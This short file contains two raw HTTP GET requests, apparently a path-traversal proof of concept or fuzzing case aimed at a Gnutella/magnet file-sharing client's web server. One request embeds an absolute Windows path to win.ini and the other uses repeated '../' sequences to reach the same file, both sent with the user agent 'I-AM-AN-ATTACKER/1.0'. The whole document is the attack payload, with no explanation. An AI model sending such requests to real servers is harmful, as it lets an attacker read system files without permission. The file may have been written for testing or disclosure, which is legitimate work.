GET /gnutella/res/C:\Windows\win.ini HTTP/1.1
User-Agent: I-AM-AN-ATTACKER/1.0
Host: 0.0.0.0:0
Accept: */*
Connection: Keep-Alive

GET /magnet10/../../../../../Windows/Win.ini?Simple-test?
User-Agent: I-AM-AN-ATTACKER/1.0
Host: 0.0.0.0:0
